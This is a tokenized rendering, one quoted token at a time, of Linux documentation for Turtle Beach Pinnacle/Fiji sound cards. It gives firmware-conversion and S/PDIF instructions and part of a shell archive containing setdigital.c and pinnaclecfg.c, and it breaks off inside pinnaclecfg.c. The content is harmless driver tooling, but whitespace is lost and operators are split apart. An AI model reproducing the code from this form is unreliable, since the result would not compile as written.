"Fiji", "#", "~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "#", "#", "Download", "to", "/", "tmp", "and", "unzip", "the", "following", "file", "from", "Turtle", "Beach", "(", "be", "#", "sure", "to", "use", "the", "entire", "URL", ";", "some", "have", "had", "trouble", "navigating", "to", "the", "#", "URL", ")", ":", "#", "#", "ftp", ":", "//", "ftp", ".", "voyetra", ".", "com", "/", "pub", "/", "tbs", "/", "pinn", "/", "pnddk100", ".", "zip", "#", "#", "Unpack", "this", "shell", "archive", ",", "and", "run", "make", "in", "the", "created", "directory", "#", "(", "you", "need", "a", "C", "compiler", "and", "flex", "to", "build", "the", "utilities", ")", ".", "This", "#", "should", "give", "you", "the", "executables", "conv", ",", "pinnaclecfg", "and", "setdigital", ".", "#", "conv", "is", "only", "used", "temporarily", "here", "to", "create", "the", "firmware", "files", ",", "#", "while", "pinnaclecfg", "is", "used", "to", "configure", "the", "Pinnacle", "or", "Fiji", "card", "in", "#", "non", "-", "PnP", "mode", ",", "and", "setdigital", "can", "be", "used", "to", "set", "the", "S", "/", "PDIF", "input", "on", "#", "the", "mixer", "(", "pinnaclecfg", "and", "setdigital", "should", "be", "copied", "to", "a", "#", "convenient", "place", ",", "possibly", "run", "during", "system", "initialization", ")", ".", "#", "#", "To", "generating", "the", "firmware", "files", "with", "the", "`", "conv", "'", "program", ",", "we", "create", "#", "the", "binary", "firmware", "files", "by", "doing", "the", "following", "conversion", "#", "(", "assuming", "the", "archive", "unpacked", "into", "a", "directory", "named", "PINNDDK", ")", ":", "#", "#", ".", "/", "conv", "<", "PINNDDK", "/", "dspcode", "/", "pndspini", ".", "asm", ">", "/", "etc", "/", "sound", "/", "pndspini", ".", "bin", "#", ".", "/", "conv", "<", "PINNDDK", "/", "dspcode", "/", "pndsperm", ".", "asm", ">", "/", "etc", "/", "sound", "/", "pndsperm", ".", "bin", "#", "#", "The", "conv", "(", "and", "conv", ".", "l", ")", "program", "is", "not", "needed", "after", "conversion", "and", "can", "#", "be", "safely", "deleted", ".", "Then", ",", "when", "configuring", "the", "Linux", "kernel", ",", "specify", "#", "/", "etc", "/", "sound", "/", "pndspini", ".", "bin", "and", "/", "etc", "/", "sound", "/", "pndsperm", ".", "bin", "for", "the", "two", "#", "firmware", "files", "(", "Linux", "kernel", "versions", "older", "than", "2", ".", "2", "do", "not", "ask", "for", "#", "firmware", "paths", ",", "and", "are", "hardcoded", "to", "/", "etc", "/", "sound", ")", ".", "#", "#", "If", "you", "are", "compiling", "the", "driver", "into", "the", "kernel", ",", "these", "files", "must", "#", "be", "accessible", "during", "compilation", ",", "but", "will", "not", "be", "needed", "later", ".", "#", "The", "files", "must", "remain", ",", "however", ",", "if", "the", "driver", "is", "used", "as", "a", "module", ".", "#", "#", "#", "Using", "Digital", "I", "/", "O", "with", "the", "S", "/", "PDIF", "Port", "#", "~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~", "#", "#", "If", "you", "have", "a", "Pinnacle", "or", "Fiji", "with", "the", "digital", "daughterboard", "and", "#", "want", "to", "set", "it", "as", "the", "input", "source", ",", "you", "can", "use", "this", "program", "if", "you", "#", "have", "trouble", "trying", "to", "do", "it", "with", "a", "mixer", "program", "(", "be", "sure", "to", "#", "insert", "the", "module", "with", "the", "digital", "=", "1", "option", ",", "or", "say", "Y", "to", "the", "option", "#", "during", "compiled", "-", "in", "kernel", "operation", ")", ".", "Upon", "selection", "of", "the", "S", "/", "PDIF", "#", "port", ",", "you", "should", "be", "able", "monitor", "and", "record", "from", "it", ".", "#", "#", "There", "is", "something", "to", "note", "about", "using", "the", "S", "/", "PDIF", "port", ".", "Digital", "#", "timing", "is", "taken", "from", "the", "digital", "signal", ",", "so", "if", "a", "signal", "is", "not", "#", "connected", "to", "the", "port", "and", "it", "is", "selected", "as", "recording", "input", ",", "you", "#", "will", "find", "PCM", "playback", "to", "be", "distorted", "in", "playback", "rate", ".", "Also", ",", "#", "attempting", "to", "record", "at", "a", "sampling", "rate", "other", "than", "the", "DAT", "rate", "may", "#", "be", "problematic", "(", "i", ".", "e", ".", "trying", "to", "record", "at", "8000Hz", "when", "the", "DAT", "signal", "#", "is", "44100Hz", ")", ".", "If", "you", "have", "a", "problem", "with", "this", ",", "set", "the", "recording", "#", "input", "to", "analog", "if", "you", "need", "to", "record", "at", "a", "rate", "other", "than", "that", "of", "#", "the", "DAT", "rate", ".", "#", "#", "#", "-", "-", "Shell", "archive", "attached", "below", ",", "just", "run", "`", "sh", "MultiSound", "'", "to", "extract", ".", "#", "Contains", "Pinnacle", "/", "Fiji", "utilities", "to", "convert", "firmware", ",", "configure", "#", "in", "non", "-", "PnP", "mode", ",", "and", "select", "the", "DIGITAL1", "input", "for", "the", "mixer", ".", "#", "#", "#", "!/", "bin", "/", "sh", "#", "This", "is", "a", "shell", "archive", "(", "produced", "by", "GNU", "sharutils", "4", ".", "2", ")", ".", "#", "To", "extract", "the", "files", "from", "this", "archive", ",", "save", "it", "to", "some", "FILE", ",", "remove", "#", "everything", "before", "the", "`", "!/", "bin", "/", "sh", "'", "line", "above", ",", "then", "type", "`", "sh", "FILE", "'", ".", "#", "#", "Made", "on", "1998", "-", "12", "-", "04", "10", ":", "07", "EST", "by", "<", "andrewtv", "@", "ztransform", ".", "velsoft", ".", "com", ">", ".", "#", "Source", "directory", "was", "`", "/", "home", "/", "andrewtv", "/", "programming", "/", "pinnacle", "/", "pinnacle", "'", ".", "#", "#", "Existing", "files", "will", "*", "not", "*", "be", "overwritten", "unless", "`", "-", "c", "'", "is", "specified", ".", "#", "#", "This", "shar", "contains", ":", "#", "length", "mode", "name", "#", "-", "--", "--", "-", "-", "--", "--", "--", "--", "-", "#", "2046", "-", "rw", "-", "rw", "-", "r", "-", "-", "MultiSound", ".", "d", "/", "setdigital", ".", "c", "#", "10235", "-", "rw", "-", "rw", "-", "r", "-", "-", "MultiSound", ".", "d", "/", "pinnaclecfg", ".", "c", "#", "106", "-", "rw", "-", "rw", "-", "r", "-", "-", "MultiSound", ".", "d", "/", "Makefile", "#", "141", "-", "rw", "-", "rw", "-", "r", "-", "-", "MultiSound", ".", "d", "/", "conv", ".", "l", "#", "1472", "-", "rw", "-", "rw", "-", "r", "-", "-", "MultiSound", ".", "d", "/", "msndreset", ".", "c", "#", "save_IFS", "=", "\"$", "{", "IFS", "}", "\"", "IFS", "=", "\"$", "{", "IFS", "}", ":\"", "gettext_dir", "=", "FAILED", "locale_dir", "=", "FAILED", "first_param", "=", "\"$", "1", "\"", "for", "dir", "in", "$", "PATH", "do", "if", "test", "\"", "$", "gettext_dir", "\"", "=", "FAILED", "&", "&", "test", "-", "f", "$", "dir", "/", "gettext", "\\", "&", "&", "(", "$", "dir", "/", "gettext", "-", "-", "version", ">", "/", "dev", "/", "null", "2", ">", "&", "1", ")", "then", "set", "`", "$", "dir", "/", "gettext", "-", "-", "version", "2", ">", "&", "1", "`", "if", "test", "\"", "$", "3", "\"", "=", "GNU", "then", "gettext_dir", "=", "$", "dir", "fi", "fi", "if", "test", "\"", "$", "locale_dir", "\"", "=", "FAILED", "&", "&", "test", "-", "f", "$", "dir", "/", "shar", "\\", "&", "&", "(", "$", "dir", "/", "shar", "-", "-", "print", "-", "text", "-", "domain", "-", "dir", ">", "/", "dev", "/", "null", "2", ">", "&", "1", ")", "then", "locale_dir", "=", "`$", "dir", "/", "shar", "-", "-", "print", "-", "text", "-", "domain", "-", "dir", "`", "fi", "done", "IFS", "=", "\"$", "save_IFS", "\"", "if", "test", "\"", "$", "locale_dir", "\"", "=", "FAILED", "|", "|", "test", "\"", "$", "gettext_dir", "\"", "=", "FAILED", "then", "echo", "=", "echo", "else", "TEXTDOMAINDIR", "=", "$", "locale_dir", "export", "TEXTDOMAINDIR", "TEXTDOMAIN", "=", "sharutils", "export", "TEXTDOMAIN", "echo", "=", "\"$", "gettext_dir", "/", "gettext", "-", "s", "\"", "fi", "touch", "-", "am", "1231235999", "$", "$.", "touch", ">", "/", "dev", "/", "null", "2", ">", "&", "1", "if", "test", "!", "-", "f", "1231235999", "&", "&", "test", "-", "f", "$", "$.", "touch", ";", "then", "shar_touch", "=", "touch", "else", "shar_touch", "=", ":", "echo", "$", "echo", "'", "WARNING", ":", "not", "restoring", "timestamps", ".", "Consider", "getting", "and", "'", "$", "echo", "\"", "installing", "GNU", "\\", "`", "touch", "'", ",", "distributed", "in", "GNU", "File", "Utilities", ".", "..", "\"", "echo", "fi", "rm", "-", "f", "1231235999", "$", "$.", "touch", "#", "if", "mkdir", "_sh01426", ";", "then", "$", "echo", "'", "x", "-", "'", "'", "creating", "lock", "directory", "'", "else", "$", "echo", "'", "failed", "to", "create", "lock", "directory", "'", "exit", "1", "fi", "#", "=", "==", "==", "==", "==", "==", "==", "MultiSound", ".", "d", "/", "setdigital", ".", "c", "=", "==", "==", "==", "==", "==", "==", "=", "if", "test", "!", "-", "d", "'", "MultiSound", ".", "d", "'", ";", "then", "$", "echo", "'", "x", "-", "'", "'", "creating", "directory", "'", "'", "MultiSound", ".", "d", "'", "mkdir", "'", "MultiSound", ".", "d", "'", "fi", "if", "test", "-", "f", "'", "MultiSound", ".", "d", "/", "setdigital", ".", "c", "'", "&", "&", "test", "\"", "$", "first_param", "\"", "!", "=", "-", "c", ";", "then", "$", "echo", "'", "x", "-", "'", "SKIPPING", "'", "MultiSound", ".", "d", "/", "setdigital", ".", "c", "'", "'", "(", "file", "already", "exists", ")", "'", "else", "$", "echo", "'", "x", "-", "'", "extracting", "'", "MultiSound", ".", "d", "/", "setdigital", ".", "c", "'", "'", "(", "text", ")", "'", "sed", "'", "s", "/", "^", "X", "/", "/'", "<", "<", "'", "SHAR_EOF", "'", ">", "'", "MultiSound", ".", "d", "/", "setdigital", ".", "c", "'", "&", "&", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "X", "*", "X", "*", "setdigital", ".", "c", "-", "sets", "the", "DIGITAL1", "input", "for", "a", "mixer", "X", "*", "X", "*", "Copyright", "(", "C", ")", "1998", "Andrew", "Veliath", "X", "*", "X", "*", "This", "program", "is", "free", "software", ";", "you", "can", "redistribute", "it", "and", "/", "or", "modify", "X", "*", "it", "under", "the", "terms", "of", "the", "GNU", "General", "Public", "License", "as", "published", "by", "X", "*", "the", "Free", "Software", "Foundation", ";", "either", "version", "2", "of", "the", "License", ",", "or", "X", "*", "(", "at", "your", "option", ")", "any", "later", "version", ".", "X", "*", "X", "*", "This", "program", "is", "distributed", "in", "the", "hope", "that", "it", "will", "be", "useful", ",", "X", "*", "but", "WITHOUT", "ANY", "WARRANTY", ";", "without", "even", "the", "implied", "warranty", "of", "X", "*", "MERCHANTABILITY", "or", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", ".", "See", "the", "X", "*", "GNU", "General", "Public", "License", "for", "more", "details", ".", "X", "*", "X", "*", "You", "should", "have", "received", "a", "copy", "of", "the", "GNU", "General", "Public", "License", "X", "*", "along", "with", "this", "program", ";", "if", "not", ",", "write", "to", "the", "Free", "Software", "X", "*", "Foundation", ",", "Inc", ".", ",", "675", "Mass", "Ave", ",", "Cambridge", ",", "MA", "02139", ",", "USA", ".", "X", "*", "X", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*/", "X", "#", "include", "<", "stdio", ".", "h", ">", "#", "include", "<", "unistd", ".", "h", ">", "#", "include", "<", "fcntl", ".", "h", ">", "#", "include", "<", "sys", "/", "types", ".", "h", ">", "#", "include", "<", "sys", "/", "stat", ".", "h", ">", "#", "include", "<", "sys", "/", "ioctl", ".", "h", ">", "#", "include", "<", "sys", "/", "soundcard", ".", "h", ">", "X", "int", "main", "(", "int", "argc", ",", "char", "*", "argv", "[", "])", "{", "X", "int", "fd", ";", "X", "unsigned", "long", "recmask", ",", "recsrc", ";", "X", "X", "if", "(", "argc", "!", "=", "2", ")", "{", "X", "fprintf", "(", "stderr", ",", "\"", "usage", ":", "setdigital", "<", "mixer", "device", ">", "\\", "n", "\"", ");", "X", "exit", "(", "1", ")", ";", "X", "}", "X", "X", "if", "(", "(", "fd", "=", "open", "(", "argv", "[", "1", "]", ",", "O_RDWR", ")", ")", "<", "0", ")", "{", "X", "perror", "(", "argv", "[", "1", "]", ");", "X", "exit", "(", "1", ")", ";", "X", "}", "X", "X", "if", "(", "ioctl", "(", "fd", ",", "SOUND_MIXER_READ_RECMASK", ",", "&", "recmask", ")", "<", "0", ")", "{", "X", "fprintf", "(", "stderr", ",", "\"", "error", ":", "ioctl", "read", "recording", "mask", "failed", "\\", "n", "\"", ");", "X", "perror", "(", "\"", "ioctl", "\"", ");", "X", "close", "(", "fd", ")", ";", "X", "exit", "(", "1", ")", ";", "X", "}", "X", "X", "if", "(", "!(", "recmask", "&", "SOUND_MASK_DIGITAL1", ")", ")", "{", "X", "fprintf", "(", "stderr", ",", "\"", "error", ":", "cannot", "find", "DIGITAL1", "device", "in", "mixer", "\\", "n", "\"", ");", "X", "close", "(", "fd", ")", ";", "X", "exit", "(", "1", ")", ";", "X", "}", "X", "X", "if", "(", "ioctl", "(", "fd", ",", "SOUND_MIXER_READ_RECSRC", ",", "&", "recsrc", ")", "<", "0", ")", "{", "X", "fprintf", "(", "stderr", ",", "\"", "error", ":", "ioctl", "read", "recording", "source", "failed", "\\", "n", "\"", ");", "X", "perror", "(", "\"", "ioctl", "\"", ");", "X", "close", "(", "fd", ")", ";", "X", "exit", "(", "1", ")", ";", "X", "}", "X", "X", "recsrc", "|", "=", "SOUND_MASK_DIGITAL1", ";", "X", "X", "if", "(", "ioctl", "(", "fd", ",", "SOUND_MIXER_WRITE_RECSRC", ",", "&", "recsrc", ")", "<", "0", ")", "{", "X", "fprintf", "(", "stderr", ",", "\"", "error", ":", "ioctl", "write", "recording", "source", "failed", "\\", "n", "\"", ");", "X", "perror", "(", "\"", "ioctl", "\"", ");", "X", "close", "(", "fd", ")", ";", "X", "exit", "(", "1", ")", ";", "X", "}", "X", "X", "close", "(", "fd", ")", ";", "X", "X", "return", "0", ";", "}", "SHAR_EOF", "$", "shar_touch", "-", "am", "1204092598", "'", "MultiSound", ".", "d", "/", "setdigital", ".", "c", "'", "&", "&", "chmod", "0664", "'", "MultiSound", ".", "d", "/", "setdigital", ".", "c", "'", "|", "|", "$", "echo", "'", "restore", "of", "'", "'", "MultiSound", ".", "d", "/", "setdigital", ".", "c", "'", "'", "failed", "'", "if", "(", "md5sum", "-", "-", "help", "2", ">", "&", "1", "|", "grep", "'", "sage", ":", "md5sum", "\\", "['", ")", ">", "/", "dev", "/", "null", "2", ">", "&", "1", "\\", "&", "&", "(", "md5sum", "-", "-", "version", "2", ">", "&", "1", "|", "grep", "-", "v", "'", "textutils", "1", ".", "12", "'", ")", ">", "/", "dev", "/", "null", ";", "then", "md5sum", "-", "c", "<", "<", "SHAR_EOF", ">", "/", "dev", "/", "null", "2", ">", "&", "1", "\\", "|", "|", "$", "echo", "'", "MultiSound", ".", "d", "/", "setdigital", ".", "c", ":", "'", "'", "MD5", "check", "failed", "'", "e87217fc3e71288102ba41fd81f71ec4", "MultiSound", ".", "d", "/", "setdigital", ".", "c", "SHAR_EOF", "else", "shar_count", "=", "\"`", "LC_ALL", "=", "LC_CTYPE", "=", "LANG", "=", "wc", "-", "c", "<", "'", "MultiSound", ".", "d", "/", "setdigital", ".", "c", "'", "`\"", "test", "2046", "-", "eq", "\"", "$", "shar_count", "\"", "|", "|", "$", "echo", "'", "MultiSound", ".", "d", "/", "setdigital", ".", "c", ":", "'", "'", "original", "size", "'", "'", "2046", ",", "'", "'", "current", "size", "'", "\"", "$", "shar_count", "!", "\"", "fi", "fi", "#", "=", "==", "==", "==", "==", "==", "==", "MultiSound", ".", "d", "/", "pinnaclecfg", ".", "c", "=", "==", "==", "==", "==", "==", "==", "=", "if", "test", "-", "f", "'", "MultiSound", ".", "d", "/", "pinnaclecfg", ".", "c", "'", "&", "&", "test", "\"", "$", "first_param", "\"", "!", "=", "-", "c", ";", "then", "$", "echo", "'", "x", "-", "'", "SKIPPING", "'", "MultiSound", ".", "d", "/", "pinnaclecfg", ".", "c", "'", "'", "(", "file", "already", "exists", ")", "'", "else", "$", "echo", "'", "x", "-", "'", "extracting", "'", "MultiSound", ".", "d", "/", "pinnaclecfg", ".", "c", "'", "'", "(", "text", ")", "'", "sed", "'", "s", "/", "^", "X", "/", "/'", "<", "<", "'", "SHAR_EOF", "'", ">", "'", "MultiSound", ".", "d", "/", "pinnaclecfg", ".", "c", "'", "&", "&", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "X", "*", "X", "*", "pinnaclecfg", ".", "c", "-", "Pinnacle", "/", "Fiji", "Device", "Configuration", "Program", "X", "*", "X", "*", "This", "is", "for", "NON", "-", "PnP", "mode", "only", ".", "For", "PnP", "mode", ",", "use", "isapnptools", ".", "X", "*", "X", "*", "This", "is", "Linux", "-", "specific", ",", "and", "must", "be", "run", "with", "root", "permissions", ".", "X", "*", "X", "*", "Part", "of", "the", "Turtle", "Beach", "MultiSound", "Sound", "Card", "Driver", "for", "Linux", "X", "*", "X", "*", "Copyright", "(", "C", ")", "1998", "Andrew", "Veliath", "X", "*", "X", "*", "This", "program", "is", "free", "software", ";", "you", "can", "redistribute", "it", "and", "/", "or", "modify", "X", "*", "it", "under", "the", "terms", "of", "the", "GNU", "General", "Public", "License", "as", "published", "by", "X", "*", "the", "Free", "Software", "Foundation", ";", "either", "version", "2", "of", "the", "License", ",", "or", "X", "*", "(", "at", "your", "option", ")", "any", "later", "version", ".", "X", "*", "X", "*", "This", "program", "is", "distributed", "in", "the", "hope", "that", "it", "will", "be", "useful", ",", "X", "*", "but", "WITHOUT", "ANY", "WARRANTY", ";", "without", "even", "the", "implied", "warranty", "of", "X", "*", "MERCHANTABILITY", "or", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", ".", "See", "the", "X", "*", "GNU", "General", "Public", "License", "for", "more", "details", ".", "X", "*", "X", "*", "You", "should", "have", "received", "a", "copy", "of", "the", "GNU", "General", "Public", "License", "X", "*", "along", "with", "this", "program", ";", "if", "not", ",", "write", "to", "the", "Free", "Software", "X", "*", "Foundation", ",", "Inc", ".", ",", "675", "Mass", "Ave", ",", "Cambridge", ",", "MA", "02139", ",", "USA", ".", "X", "*", "X", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*/", "X", "#", "include", "<", "stdio", ".", "h", ">", "#", "include", "<", "stdlib", ".", "h", ">", "#", "include", "<", "string", ".", "h", ">", "#", "include", "<", "errno", ".", "h", ">", "#", "include", "<", "unistd", ".", "h", ">", "#", "include", "<", "asm", "/", "io", ".", "h", ">", "#", "include", "<", "asm", "/", "types", ".", "h", ">", "X", "#", "define", "IREG_LOGDEVICE", "0x07", "#", "define", "IREG_ACTIVATE", "0x30", "#", "define", "LD_ACTIVATE", "0x01", "#", "define", "LD_DISACTIVATE", "0x00", "#", "define", "IREG_EECONTROL", "0x3F", "#", "define", "IREG_MEMBASEHI", "0x40", "#", "define", "IREG_MEMBASELO", "0x41", "#", "define", "IREG_MEMCONTROL", "0x42", "#", "define", "IREG_MEMRANGEHI", "0x43", "#", "define", "IREG_MEMRANGELO", "0x44", "#", "define", "MEMTYPE_8BIT", "0x00", "#", "define", "MEMTYPE_16BIT", "0x02", "#", "define", "MEMTYPE_RANGE", "0x00", "#", "define", "MEMTYPE_HIADDR", "0x01", "#", "define", "IREG_IO0_BASEHI", "0x60", "#", "define", "IREG_IO0_BASELO", "0x61", "#", "define", "IREG_IO1_BASEHI", "0x62", "#", "define", "IREG_IO1_BASELO", "0x63", "#", "define", "IREG_IRQ_NUMBER", "0x70", "#", "define", "IREG_IRQ_TYPE", "0x71", "#", "define", "IRQTYPE_HIGH", "0x02", "#", "define", "IRQTYPE_LOW", "0x00", "#", "define", "IRQTYPE_LEVEL", "0x01", "#", "define", "IRQTYPE_EDGE", "0x00", "X", "#", "define", "HIBYTE", "(", "w", ")", "(", "(", "BYTE", ")", "((", "(", "WORD", ")", "(", "w", ")", ">", ">", "8", ")", "&", "0xFF", ")", ")", "#", "define", "LOBYTE", "(", "w", ")", "(", "(", "BYTE", ")", "(", "w", ")", ")", "#", "define", "MAKEWORD", "(", "low", ",", "hi", ")", "(", "(", "WORD", ")", "((", "(", "BYTE", ")", "(", "low", ")", ")|", "((", "(", "WORD", ")", "((", "BYTE", ")", "(", "hi", ")", "))", "<<", "8", ")", "))", "X", "typedef", "__u8", "BYTE", ";", "typedef", "__u16", "USHORT", ";", "typedef", "__u16", "WORD", ";", "X", "static", "int", "config_port", "=", "-", "1", ";", "X", "static", "int", "msnd_write_cfg", "(", "int", "cfg", ",", "int", "reg", ",", "int", "value", ")", "{", "X", "outb", "(", "reg", ",", "cfg", ")", ";", "X", "outb", "(", "value", ",", "cfg", "+", "1", ")", ";", "X", "if", "(", "value", "!", "=", "inb", "(", "cfg", "+", "1", ")", ")", "{", "X", "fprintf", "(", "stderr", ",", "\"", "error", ":", "msnd_write_cfg", ":", "I", "/", "O", "error", "\\", "n", "\"", ");", "X", "return", "-", "EIO", ";", "X", "}", "X", "return", "0", ";", "}", "X", "static", "int", "msnd_read_cfg", "(", "int", "cfg", ",", "int", "reg", ")", "{", "X", "outb", "(", "reg", ",", "cfg", ")", ";", "X", "return", "inb", "(", "cfg", "+", "1", ")", ";", "}", "X", "static", "int", "msnd_write_cfg_io0", "(", "int", "cfg", ",", "int", "num", ",", "WORD", "io", ")", "{", "X", "if", "(", "msnd_write_cfg", "(", "cfg", ",", "IREG_LOGDEVICE", ",", "num", ")", ")", "X", "return", "-", "EIO", ";", "X", "if", "(", "msnd_write_cfg", "(", "cfg", ",", "IREG_IO0_BASEHI", ",", "HIBYTE", "(", "io", ")", "))", "X", "return", "-", "EIO", ";", "X", "if", "(", "msnd_write_cfg", "(", "cfg", ",", "IREG_IO0_BASELO", ",", "LOBYTE", "(", "io", ")", "))", "X", "return", "-", "EIO", ";", "X", "return", "0", ";", "}", "X", "static", "int", "msnd_read_cfg_io0", "(", "int", "cfg", ",", "int", "num", ",", "WORD", "*", "io", ")", "{", "X", "if", "(", "msnd_write_cfg", "(", "cfg", ",", "IREG_LOGDEVICE", ",", "num", ")", ")", "X", "return", "-", "EIO", ";", "X", "X", "*", "io", "=", "MAKEWORD", "(", "msnd_read_cfg", "(", "cfg", ",", "IREG_IO0_BASELO", ")", ",", "X", "msnd_read_cfg", "(", "cfg", ",", "IREG_IO0_BASEHI", ")", ");", "X", "X", "return", "0", ";", "}", "X", "static", "int", "msnd_write_cfg_io1", "(", "int", "cfg", ",", "int", "num", ",", "WORD", "io", ")", "{", "X", "if", "(", "msnd_write_cfg", "(", "cfg", ",", "IREG_LOGDEVICE", ",", "num", ")", ")", "X", "return", "-", "EIO", ";", "X", "if", "(", "msnd_write_cfg", "(", "cfg", ",", "IREG_IO1_BASEHI", ",", "HIBYTE", "(", "io", ")", "))", "X", "return", "-", "EIO", ";", "X", "if", "(", "msnd_write_cfg", "(", "cfg", ",", "IREG_IO1_BASELO", ",", "LOBYTE", "(", "io", ")", "))", "X", "return", "-", "EIO", ";", "X", "return", "0", ";", "}", "X", "static", "int", "msnd_read_cfg_io1", "(", "int", "cfg", ",", "int", "num", ",", "WORD", "*", "io", ")", "{", "X", "if", "(", "msnd_write_cfg", "(", "cfg", ",", "IREG_LOGDEVICE", ",", "num", ")", ")", "X", "return", "-", "EIO", ";", "X", "X", "*", "io", "=", "MAKEWORD", "(", "msnd_read_cfg", "(", "cfg", ",", "IREG_IO1_BASELO", ")", ",", "X", "msnd_read_cfg", "(", "cfg", ",", "IREG_IO1_BASEHI", ")", ");", "X", "X", "return", "0", ";", "}", "X", "static", "int", "msnd_write_cfg_irq", "(", "int", "cfg", ",", "int", "num", ",", "WORD", "irq", ")", "{", "X", "if", "(", "msnd_write_cfg", "(", "cfg", ",", "IREG_LOGDEVICE", ",", "num", ")", ")", "X", "return", "-", "EIO", ";", "X", "if", "(", "msnd_write_cfg", "(", "cfg", ",", "IREG_IRQ_NUMBER", ",", "LOBYTE", "(", "irq", ")", "))", "X", "return", "-", "EIO", ";", "X", "if", "(", "msnd_write_cfg", "(", "cfg", ",", "IREG_IRQ_TYPE", ",", "IRQTYPE_EDGE", ")", ")", "X", "return", "-", "EIO", ";", "X", "return", "0", ";", "}", "X", "static", "int", "msnd_read_cfg_irq", "(", "int", "cfg", ",", "int", "num", ",", "WORD", "*", "irq", ")", "{", "X", "if", "(", "msnd_write_cfg", "(", "cfg", ",", "IREG_LOGDEVICE", ",", "num", ")", ")", "X", "return", "-", "EIO", ";", "X", "X", "*", "irq", "=", "msnd_read_cfg", "(", "cfg", ",", "IREG_IRQ_NUMBER", ")", ";", "X", "X", "return", "0", ";", "}", "X", "static", "int", "msnd_write_cfg_mem", "(", "int", "cfg", ",", "int", "num", ",", "int", "mem", ")", "{", "X", "WORD", "wmem", ";", "X", "X", "mem", ">", ">=", "8", ";", "X", "mem", "&", "=", "0xfff", ";", "X", "wmem", "=", "(", "WORD", ")", "mem", ";", "X", "if", "(", "msnd_write_cfg", "(", "cfg", ",", "IREG_LOGDEVICE", ",", "num", ")", ")", "X", "return", "-", "EIO", ";", "X", "if", "(", "msnd_write_cfg", "(", "cfg", ",", "IREG_MEMBASEHI", ",", "HIBYTE", "(", "wmem", ")", "))", "X", "return", "-", "EIO", ";", "X", "if", "(", "msnd_write_cfg", "(", "cfg", ",", "IREG_MEMBASELO", ",", "LOBYTE", "(", "wmem", ")", "))", "X", "return", "-", "EIO", ";", "X", "if", "(", "wmem", "&", "&", "msnd_write_cfg", "(", "cfg", ",", "IREG_MEMCONTROL", ",", "(", "MEMTYPE_HIADDR", "|", "MEMTYPE_16BIT", ")", "))", "X", "return", "-", "EIO", ";", "X", "return", "0", ";", "}", "X", "static", "int", "msnd_read_cfg_mem", "(", "int", "cfg", ",", "int", "num", ",", "int", "*", "mem", ")", "{", "X", "if", "(", "msnd_write_cfg", "(", "cfg", ",", "IREG_LOGDEVICE", ",", "num", ")", ")", "X", "return", "-", "EIO", ";", "X", "X", "*", "mem", "=", "MAKEWORD", "(", "msnd_read_cfg", "(", "cfg", ",", "IREG_MEMBASELO", ")", ",", "X", "msnd_read_cfg", "(", "cfg", ",", "IREG_MEMBASEHI", ")", ");", "X", "*", "mem", "<", "<=", "8", ";", "X", "X", "return", "0", ";", "}", "X", "static", "int", "msnd_activate_logical", "(", "int", "cfg", ",", "int", "num", ")", "{", "X", "if", "(", "msnd_write_cfg", "(", "cfg", ",", "IREG_LOGDEVICE", ",", "num", ")", ")", "X", "return", "-", "EIO", ";", "X", "if", "(", "msnd_write_cfg", "(", "cfg", ",", "IREG_ACTIVATE", ",", "LD_ACTIVATE", ")", ")", "X", "return", "-", "EIO", ";", "X", "return", "0", ";", "}", "X", "static", "int", "msnd_write_cfg_logical", "(", "int", "cfg", ",", "int", "num", ",", "WORD", "io0", ",", "WORD", "io1", ",", "WORD", "irq", ",", "int", "mem", ")", "{", "X", "if", "(", "msnd_write_cfg", "(", "cfg", ",", "IREG_LOGDEVICE", ",", "num", ")", ")", "X", "return", "-", "EIO", ";", "X", "if", "(", "msnd_write_cfg_io0", "(", "cfg", ",", "num", ",", "io0", ")", ")", "X", "return", "-", "EIO", ";", "X", "if", "(", "msnd_write_cfg_io1", "(", "cfg", ",", "num", ",", "io1", ")", ")", "X", "return", "-", "EIO", ";", "X", "if", "(", "msnd_write_cfg_irq", "(", "cfg", ",", "num", ",", "irq", ")", ")", "X", "return", "-", "EIO", ";", "X", "if", "(", "msnd_write_cfg_mem", "(", "cfg", ",", "num", ",", "mem", ")", ")", "X", "return", "-", "EIO", ";", "X", "if", "(", "msnd_activate_logical", "(", "cfg", ",", "num", ")", ")", "X", "return", "-", "EIO", ";", "X", "return", "0", ";", "}", "X", "static", "int", "msnd_read_cfg_logical", "(", "int", "cfg", ",", "int", "num", ",", "WORD", "*", "io0", ",", "WORD", "*", "io1", ",", "WORD", "*", "irq", ",", "int", "*", "mem", ")", "{", "X", "if", "(", "msnd_write_cfg", "(", "cfg", ",", "IREG_LOGDEVICE", ",", "num", ")", ")", "X", "return", "-", "EIO", ";", "X", "if", "(", "msnd_read_cfg_io0", "(", "cfg", ",", "num", ",", "io0", ")", ")", "X", "return", "-", "EIO", ";", "X", "if", "(", "msnd_read_cfg_io1", "(", "cfg", ",", "num", ",", "io1", ")", ")", "X", "return", "-", "EIO", ";", "X", "if", "(", "msnd_read_cfg_irq", "(", "cfg", ",", "num", ",", "irq", ")", ")", "X", "return", "-", "EIO", ";", "X", "if", "(", "msnd_read_cfg_mem", "(", "cfg", ",", "num", ",", "mem", ")", ")", "X", "return", "-", "EIO", ";", "X", "return", "0", ";", "}", "X", "static", "void", "usage", "(", "void", ")", "{", "X", "fprintf", "(", "stderr", ",", "X", "\"", "\\", "n", "\"", "X", "\"", "pinnaclecfg", "1", ".", "0", "\\", "n", "\"", "X", "\"", "\\", "n", "\"", "X", "\"", "usage", ":", "pinnaclecfg", "<", "config", "port", ">", "[", "device", 